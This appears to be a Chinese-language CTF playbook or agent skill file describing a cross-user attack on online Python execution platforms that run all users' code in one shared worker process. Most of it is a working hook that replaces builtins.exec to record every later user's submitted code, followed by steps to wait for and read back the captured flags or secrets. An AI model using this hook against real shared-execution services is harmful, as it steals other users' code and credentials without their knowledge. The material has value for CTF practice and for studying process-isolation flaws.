---
name: Python Exec Hook Cross User Capture
description: 单 worker ProcessPoolExecutor 共享进程：monkey-patch builtins.exec 跨用户捕获代码
triggers: python, sandbox, exec hook, 共享进程, ProcessPoolExecutor, builtins.exec, flowlab
category: sandbox
---

## 场景
在线"工作流/脚本执行"平台：普通用户可提交 Python 代码，后端用 `ProcessPoolExecutor(max_workers=1)`（或常驻 worker 进程）`exec(code, namespace)` 执行。**同一 worker 进程为所有用户服务且不重启**——进程内模块级全局状态、`builtins` 修改天然跨请求、跨用户共享。目标用户（机器人/受害用户）会周期性提交包含敏感数据（flag/密钥）的代码。

## 识别要点
- 注册登录后 `/api/code/run` 类端点 POST `{code: "..."}` 执行 Python，响应 `{output, error, exitCode}`。
- 无沙箱/无进程隔离提示（CTF 场景）；或 worker 数=1（可用并发请求观察排队现象判断）。
- 平台 hint 若提到"模块级全局状态共享 / hook 内置函数 / 等一等"，即此打法。

## 攻击步骤
1. **安装 hook**（幂等，保存原函数避免递归）：
   ```python
   import builtins
   _e = builtins.exec
   if not hasattr(builtins, '_orig_exec'):
       builtins._orig_exec = _e
   def _h(s, *a, **k):
       try:
           if isinstance(s, str):
               builtins.__cap = getattr(builtins, '__cap', [])
               builtins.__cap.append(s)
               with open('/tmp/cap.log', 'a') as f:
                   f.write(s + '\n=====\n')
       except Exception:
           pass
       return builtins._orig_exec(s, *a, **k)
   builtins.exec = _h
   builtins.__cap = getattr(builtins, '__cap', [])
   ```
   关键：hook `exec` 因为执行器每次跑用户代码必经 `exec()`；内存列表 + 落盘文件双保险（内存可能被读 payload 输出截断，文件可分段读）。
2. **验证持久性**：再提交一次代码，读 `__cap` 长度递增即 hook 生效且跨请求存在。
3. **等待**：目标用户周期任务频率未知，先等 60~120s 轮询读取。
4. **读取**：提交读取 payload 打印 `builtins.__cap`（注意响应输出长度限制，分段打印 `repr(x)[:800]`）。
5. 目标代码里的 secret/flag 通常明文在源码字符串中。

## 注意
- 读取 payload 自身也会被 hook 追加进 cap，属正常噪音。
- 若第一轮没捕获到，不要改 hook，继续等（bot 周期可能较长）。
- 别在共享 worker 里跑重型任务（全盘 walk 等）占住 worker 导致后续请求排队/超时。
- 判死前确认是通道问题（500/超时/Envoy 503）还是应用层拒绝；worker 被 kill 后 `BrokenProcessPool` 可能让端点持续 500，容器重启或等待可自愈。